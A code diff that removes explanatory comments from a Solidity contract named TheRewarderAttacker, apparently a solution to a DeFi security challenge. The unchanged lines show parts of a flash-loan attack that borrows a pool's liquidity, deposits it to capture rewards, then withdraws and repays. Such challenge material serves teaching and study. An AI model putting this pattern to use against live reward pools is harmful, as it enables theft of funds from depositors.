@@ -13,7 +13,6 @@ import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/utils/Address.sol";
 import "@openzeppelin/contracts/math/SafeMath.sol";
 
-// The Rewarder Pool and Flash Loaner Pool Interfaces
 interface ITheRewarderPool {
     function deposit(uint256 amountToDeposit) external;
 
@@ -42,7 +41,6 @@ contract TheRewarderAttacker {
         flashLoanPool = _flashLoanPool;
         rewarderPool = _rewarderPool;
 
-        // Starts off by taking a flash loan out and depositing it back into rewards pool. It instantly receives rewards, while paying back the flash loan
         uint256 flashLoanBalance =
             liquidityToken.balanceOf(address(flashLoanPool));
 
@@ -57,7 +55,7 @@ contract TheRewarderAttacker {
             );
         require(success, "reward transfer failed");
     }
-    // Deposits rewards and pays back flash loan sender
+    
     function receiveFlashLoan(uint256 amount) external {
         rewarderPool.deposit(amount);
         rewarderPool.withdraw(amount);
